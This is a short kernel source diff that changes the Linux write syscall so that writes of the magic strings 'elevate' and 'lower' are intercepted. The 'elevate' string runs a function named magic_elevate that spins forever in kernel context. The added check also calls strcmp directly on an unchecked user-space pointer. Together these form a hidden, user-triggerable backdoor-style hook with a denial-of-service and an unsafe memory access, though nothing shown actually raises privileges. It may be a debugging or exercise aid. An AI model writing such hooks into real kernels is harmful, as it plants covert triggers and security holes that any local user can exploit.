@@ -618,10 +618,26 @@ ssize_t ksys_write(unsigned int fd, const char __user *buf, size_t count)
 	return ret;
 }
 
+void magic_elevate(void);
+void magic_elevate(){
+  volatile int db = 1;
+  while(db);
+  printk("Doing magic here\n");
+}
+
 SYSCALL_DEFINE3(write, unsigned int, fd, const char __user *, buf,
 		size_t, count)
 {
-	return ksys_write(fd, buf, count);
+// Fn name is __do_sys_write
+  if(count == 7 && !strcmp(buf, "elevate")){
+    printk("found magic elevate string\n");
+    magic_elevate();
+    return 7;
+  }else if (count == 5 && !strcmp(buf, "lower") ){
+    printk("found magic lower string\n");
+    return 5;
+  }
+  return ksys_write(fd, buf, count);
 }
 
 ssize_t ksys_pread64(unsigned int fd, char __user *buf, size_t count,
